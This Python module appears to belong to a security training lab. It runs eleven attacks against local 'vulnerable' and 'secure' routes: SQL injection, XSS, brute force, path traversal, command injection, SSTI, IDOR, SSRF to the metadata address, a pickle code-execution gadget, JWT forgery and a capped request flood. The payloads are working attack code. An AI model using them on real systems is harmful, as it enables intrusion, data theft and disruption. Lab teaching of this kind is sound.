"""The attack catalog.

Each function drives one vulnerability against the local lab, prints what it did, and
returns an ``AttackResult``. Every attack is run against both the vulnerable and the
secure route so the output itself tells the Red Team vs Blue Team story: the same
payload lands on ``/vulnerable`` and is rejected on ``/secure``.
"""

from __future__ import annotations

import base64
import contextlib
import os
import pickle  # noqa: S403 - used to craft a demo payload against the local lab only
import time
from dataclasses import dataclass, field
from pathlib import Path

import jwt
import requests


@dataclass
class AttackResult:
    name: str
    vulnerable_outcome: str
    secure_outcome: str
    notes: list[str] = field(default_factory=list)


def _get(base: str, path: str, **kwargs) -> requests.Response:
    return requests.get(f"{base}{path}", timeout=5, **kwargs)


def sqli(base: str) -> AttackResult:
    payload = {"id": "0 UNION SELECT username, password, role FROM users"}
    vuln = _get(base, "/vulnerable/sql", params=payload).json()
    sec = _get(base, "/secure/sql", params=payload)
    leaked = vuln.get("results", [])
    return AttackResult(
        "SQL Injection",
        f"leaked {len(leaked)} row(s) incl. credentials: {leaked[:1]}",
        f"HTTP {sec.status_code} (input rejected / parameterized)",
    )


def xss(base: str) -> AttackResult:
    payload = {"name": "<script>alert(document.domain)</script>"}
    vuln = _get(base, "/vulnerable/xss", params=payload).text
    sec = _get(base, "/secure/xss", params=payload).text
    return AttackResult(
        "Reflected XSS",
        "payload reflected unescaped" if "<script>" in vuln else "not reflected",
        "payload escaped" if "<script>" not in sec else "STILL VULNERABLE",
    )


def brute_force(base: str, wordlist: Path | None = None) -> AttackResult:
    words = _load_wordlist(wordlist)
    found = None
    for candidate in words:
        resp = _get(base, "/vulnerable/login", params={"username": "admin", "password": candidate})
        if resp.json().get("status") == "ok":
            found = candidate
            break
    # The secure endpoint is POST + rate limited; show the rate limit kicking in.
    statuses = [
        requests.post(
            f"{base}/secure/login", data={"username": "admin", "password": "x"}, timeout=5
        ).status_code
        for _ in range(8)
    ]
    blocked = statuses.count(429)
    return AttackResult(
        "Brute Force",
        f"password cracked: '{found}'" if found else "not found in wordlist",
        f"{blocked}/8 attempts rate-limited (HTTP 429)",
    )


def path_traversal(base: str) -> AttackResult:
    payload = {"name": "../../config.py"}
    vuln = _get(base, "/vulnerable/file", params=payload).json()
    sec = _get(base, "/secure/file", params=payload)
    leaked = "SECRET_KEY" in vuln.get("content", "")
    return AttackResult(
        "Path Traversal",
        "read source outside sandbox (config.py leaked)" if leaked else "no leak",
        f"HTTP {sec.status_code} (traversal blocked)",
    )


def command_injection(base: str) -> AttackResult:
    sep = "&" if os.name == "nt" else ";"
    payload = {"host": f"127.0.0.1{sep} echo INJECTED"}
    vuln = _get(base, "/vulnerable/ping", params=payload).json()
    sec = _get(base, "/secure/ping", params=payload)
    ran = "INJECTED" in vuln.get("output", "")
    return AttackResult(
        "Command Injection",
        "injected command executed" if ran else "not executed",
        f"HTTP {sec.status_code} (host validation rejected input)",
    )


def ssti(base: str) -> AttackResult:
    payload = {"name": "{{7*7}}"}
    vuln = _get(base, "/vulnerable/ssti", params=payload).text
    sec = _get(base, "/secure/ssti", params=payload).text
    return AttackResult(
        "SSTI",
        "template evaluated (7*7 -> 49)" if "49" in vuln else "not evaluated",
        "rendered as literal text" if "49" not in sec else "STILL VULNERABLE",
    )


def idor(base: str) -> AttackResult:
    # As user bob (id 3), try to read admin's (id 1) private note.
    vuln = _get(base, "/vulnerable/account/1").json()
    sec = _get(base, "/secure/account/1", headers={"X-User-Id": "3"})
    leaked = "private_note" in vuln
    return AttackResult(
        "IDOR",
        f"read another user's note: {vuln.get('private_note')!r}" if leaked else "no access",
        f"HTTP {sec.status_code} (ownership check denied access)",
    )


def ssrf(base: str) -> AttackResult:
    payload = {"url": "http://169.254.169.254/latest/meta-data/"}
    vuln = _get(base, "/vulnerable/fetch", params=payload)
    sec = _get(base, "/secure/fetch", params=payload)
    return AttackResult(
        "SSRF",
        f"server attempted internal fetch (HTTP {vuln.status_code})",
        f"HTTP {sec.status_code} (internal address refused)",
        notes=["169.254.169.254 is the cloud metadata endpoint - a classic SSRF target"],
    )


def deserialization(base: str) -> AttackResult:
    marker = Path(os.environ.get("TEMP", "/tmp")) / "red_team_pwned_demo"

    class _Exploit:
        def __reduce__(self):
            # On the vulnerable endpoint, unpickling invokes this and creates the dir,
            # proving arbitrary code execution. Harmless, local, cleaned up below.
            return (os.makedirs, (str(marker), 0o777, True))

    data = base64.b64encode(pickle.dumps(_Exploit())).decode()
    # The request is the exploit: unpickling on the server runs _Exploit.__reduce__.
    _get(base, "/vulnerable/deserialize", params={"data": data})
    executed = marker.exists()
    if executed:
        marker.rmdir()
    sec = _get(base, "/secure/deserialize", params={"data": data})
    return AttackResult(
        "Insecure Deserialization",
        "arbitrary code executed during unpickle" if executed else "no execution",
        f"HTTP {sec.status_code} (JSON-only, no object construction)",
    )


def jwt_forge(base: str) -> AttackResult:
    forged = jwt.encode({"role": "admin"}, "attacker-does-not-know-the-key", algorithm="HS256")
    vuln = _get(base, "/vulnerable/jwt/admin", params={"token": forged})
    sec = _get(base, "/secure/jwt/admin", params={"token": forged})
    return AttackResult(
        "JWT Signature Bypass",
        f"forged admin token accepted (HTTP {vuln.status_code})",
        f"HTTP {sec.status_code} (signature verification rejected forgery)",
    )


def load_test(base: str, duration: float = 5.0, workers: int = 10) -> AttackResult:
    """A deliberately tame L7 traffic generator (the repositioned 'DDoS' demo).

    Half the workers flood the unprotected endpoint, half flood the rate-limited one,
    so the result contrasts a flood that is served in full against a flood that is
    throttled. Capped at 10s / 20 workers and loopback-only (see guard): enough to
    show the mitigation, never enough to be a weapon. Ctrl+C is a clean kill switch.
    """
    import concurrent.futures

    duration = min(duration, 10.0)
    workers = min(workers, 20)
    deadline = time.monotonic() + duration
    red = {"served": 0}
    blue = {"sent": 0, "throttled": 0}

    def flood_unprotected() -> None:
        while time.monotonic() < deadline:
            with contextlib.suppress(requests.RequestException):
                requests.get(f"{base}/vulnerable/xss", params={"name": "x"}, timeout=2)
                red["served"] += 1

    def flood_rate_limited() -> None:
        while time.monotonic() < deadline:
            with contextlib.suppress(requests.RequestException):
                resp = requests.post(
                    f"{base}/secure/login", data={"username": "admin", "password": "x"}, timeout=2
                )
                blue["sent"] += 1
                if resp.status_code == 429:
                    blue["throttled"] += 1

    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as pool:
            for i in range(workers):
                pool.submit(flood_unprotected if i % 2 == 0 else flood_rate_limited)
    except KeyboardInterrupt:
        pass  # kill switch: Ctrl+C stops cleanly

    return AttackResult(
        "L7 Load Test",
        f"{red['served']} reqs served unthrottled by /vulnerable in {duration:.0f}s",
        f"{blue['throttled']}/{blue['sent']} reqs to /secure throttled (HTTP 429)",
        notes=["Capped at 10s / 20 workers and loopback-only on purpose."],
    )


def _load_wordlist(path: Path | None) -> list[str]:
    if path is None:
        path = Path(__file__).parent / "wordlists" / "common-passwords.txt"
    return [line.strip() for line in path.read_text(encoding="utf-8").splitlines() if line.strip()]


# Registry consumed by the CLI. Order mirrors the lab catalog.
ATTACKS = {
    "sqli": sqli,
    "xss": xss,
    "brute-force": brute_force,
    "traversal": path_traversal,
    "cmdi": command_injection,
    "ssti": ssti,
    "idor": idor,
    "ssrf": ssrf,
    "deserialize": deserialization,
    "jwt-forge": jwt_forge,
    "load-test": load_test,
}
